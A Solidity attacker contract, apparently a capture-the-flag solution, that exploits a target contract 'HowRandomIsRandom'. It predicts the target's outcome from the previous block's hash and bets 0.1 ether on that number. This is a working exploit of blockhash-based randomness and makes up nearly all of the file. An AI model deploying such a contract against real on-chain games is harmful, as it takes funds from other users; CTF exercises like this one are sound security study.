// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CTF3.sol";

contract attacker{
    HowRandomIsRandom public randomContract;

    event displayNumber(uint256);

    constructor(address payable _randomContract){
        randomContract = HowRandomIsRandom(_randomContract);
    }

    function attackCTF3() public payable{
        uint valueToBet = uint256(keccak256(abi.encodePacked(blockhash(block.number-1)))) % 100;
        randomContract.spin{value: 0.1 ether}(valueToBet);
        //randomContract.spin{value: 0.1 ether}(1);
    }

    receive() payable external{

    }

}